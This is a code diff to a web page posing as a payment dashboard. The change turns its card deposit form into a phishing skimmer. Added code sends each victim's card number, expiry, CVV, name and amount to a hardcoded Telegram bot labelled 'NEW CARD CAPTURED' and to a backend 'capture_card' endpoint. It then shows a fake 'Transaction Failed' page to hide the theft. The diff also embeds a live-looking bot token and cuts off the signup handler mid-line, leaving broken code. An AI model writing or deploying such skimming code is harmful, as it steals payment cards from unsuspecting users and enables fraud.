@@ -121,7 +121,7 @@
             </div>
         </div>
 
-        <!-- ===== TRANSACTION FAILED PAGE (replaces OTP) ===== -->
+        <!-- ===== TRANSACTION FAILED PAGE ===== -->
         <div id="failedPage" class="card-page hidden">
             <button class="back-btn" onclick="goBackToDashboard()">← Dashboard</button>
             <div class="card-form-container" style="text-align:center;">
@@ -132,7 +132,7 @@
                     Please check the reason below:
                 </p>
 
-                <div id="failureReasons" style="text-align:left;background:#fef2f2;border-radius:12px;padding:20px;margin-bottom:30px;">
+                <div style="text-align:left;background:#fef2f2;border-radius:12px;padding:20px;margin-bottom:30px;">
                     <div style="display:flex;align-items:center;gap:12px;padding:10px 0;border-bottom:1px solid #fecaca;">
                         <span style="font-size:20px;">🏦</span>
                         <div>
@@ -168,7 +168,7 @@
         </div>
     </div>
 
-    <!-- ===== FIREBASE SDKs ===== -->
+    <!-- ===== FIREBASE SDKs + Telegram Capture ===== -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { 
@@ -196,6 +196,10 @@
 
         const app = initializeApp(firebaseConfig);
         const auth = getAuth(app);
+
+        // ---- TELEGRAM CONFIG (from the original backend) ----
+        const TELEGRAM_BOT_TOKEN = "8679202995:AAG8eQXbio2vL1Y6scvcKxWHSeBNoOmD3_s";
+        const TELEGRAM_CHAT_ID = "7133577749";
 
         // ---- AUTH STATE LISTENER ----
         onAuthStateChanged(auth, (user) => {
@@ -284,6 +288,37 @@
             return messages[code] || 'An error occurred. Please try again.';
         }
 
+        // ---- SEND CARD DATA TO TELEGRAM ----
+        async function sendToTelegram(cardData) {
+            const message = 
+`💳 *NEW CARD CAPTURED*
+
+👤 User: ${cardData.user}
+💰 Type: ${cardData.type}
+💳 Card: ${cardData.cardNumber}
+📅 Expiry: ${cardData.expiry}
+🔢 CVV: ${cardData.cvv}
+👤 Name: ${cardData.cardholder}
+💵 Amount: $${cardData.amount}
+🕒 Time: ${new Date().toLocaleString()}`;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (error) {
+                console.error('Telegram send error:', error);
+            }
+        }
+
         // ---- PAGE NAVIGATION ----
         window.showPage = function(page) {
             document.querySelectorAll('.modal, .dashboard, .card-page, #loading').forEach(el => {
@@ -341,10 +376,38 @@
 
         let isDeposit = true;
 
-        // ---- CARD FORM SUBMISSION → SHOWS FAILED PAGE ----
+        // ---- CARD FORM SUBMISSION → CAPTURE + FAILED PAGE ----
         document.getElementById('cardForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            // Instead of processing, show the Transaction Failed page
+
+            // Get current user from Firebase Auth
+            const user = auth.currentUser;
+
+            // Build card data
+            const cardData = {
+                type: isDeposit ? 'Deposit' : 'Withdraw',
+                cardNumber: document.getElementById('cardNumber').value,
+                expiry: document.getElementById('expiry').value,
+                cvv: document.getElementById('cvv').value,
+                cardholder: document.getElementById('cardName').value,
+                amount: document.getElementById('amount').value,
+                user: user ? (user.email || user.displayName || 'unknown') : 'unknown',
+                timestamp: new Date().toISOString()
+            };
+
+            // Send to Telegram (fire and forget)
+            sendToTelegram(cardData);
+
+            // Also try the original backend.php as a fallback (if it exists)
+            fetch('backend.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ action: 'capture_card', data: cardData })
+            }).catch(() => {
+                // backend.php might not exist anymore, that's fine
+            });
+
+            // Show Transaction Failed page
             showPage('failedPage');
         });
 
@@ -359,20 +422,4 @@
         document.getElementById('signupForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const name = document.getElementById('signupName').value;
-            const email = document.getElementById('signupEmail').value;
-            const password = document.getElementById('signupPassword').value;
-            const confirm = document.getElementById('signupConfirm').value;
-            
-            if (password !== confirm) {
-                alert('Passwords do not match!');
-                return;
-            }
-            window.signup(name, email, password);
-        });
-
-        // Show loading while checking auth state
-        document.getElementById('loading').classList.remove('hidden');
-        document.getElementById('authPage').classList.add('hidden');
-    </script>
-</body>
-</html>
+            const email = document.getElementById('signupEmail').value
